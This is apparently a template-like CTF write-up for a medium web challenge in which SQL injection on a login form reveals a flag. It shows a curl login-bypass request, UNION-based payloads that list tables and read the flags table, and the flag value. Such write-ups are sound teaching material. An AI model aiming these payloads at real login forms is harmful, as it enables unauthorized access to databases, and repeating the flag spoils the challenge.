# Web Injection Challenge

**Category:** Web Security  
**Difficulty:** Medium  
**CTF:** PBCTF

## Challenge Description

This challenge involved exploiting a SQL injection vulnerability in a web application. The goal was to extract sensitive information from the database. The challenge presents a web application with a login form that is vulnerable to SQL injection attacks.

![Challenge Interface](path/to/challenge_image.png)
*Caption: The vulnerable web application login page*

## Files and Resources

- [Exploit Script](https://github.com/Farhan-25/CTF-Scripts/blob/main/sql_injection_exploit.py) - Python script used for automated exploitation
- [Payload Collection](https://drive.google.com/file/d/example123/view) - Collection of SQL injection payloads
- [Burp Suite Project](https://www.dropbox.com/s/example/burp_project.zip) - Burp Suite project file with all requests

## Solution

### Step 1: Reconnaissance

First, I identified the vulnerable parameter in the login form:

```bash
# Testing for SQL injection
curl -X POST http://challenge.example.com/login \
  -d "username=admin' OR '1'='1&password=test"
```

![Login Page](https://images.unsplash.com/photo-1550751827-4bd374c3f58b?w=800&h=600&fit=crop)
*Caption: The vulnerable login page where we discovered the SQL injection*

### Step 2: Exploitation

I used a UNION-based SQL injection to extract table names:

```sql
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema = database()--
```

![SQL Injection Payload](https://images.unsplash.com/photo-1461749280684-dccba630e2f6?w=800&h=600&fit=crop)
*Caption: Testing the SQL injection payload in Burp Suite*

![Database Tables](https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=800&h=600&fit=crop)
*Caption: Extracted database schema showing the flags table*

### Step 3: Flag Extraction

After identifying the `flags` table, I extracted the flag:

```sql
' UNION SELECT flag FROM flags--
```

## Flag

```
PBCTF{5ql_1nj3ct10n_15_d4ng3r0us}
```

## Screenshots

> **Note:** You can place images inline within any step (as shown above) or group them here at the end. Use relative paths like `./images/screenshot1.png` or absolute URLs.

## References

- [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection)
- [OWASP SQL Injection Guide](https://owasp.org/www-community/attacks/SQL_Injection)

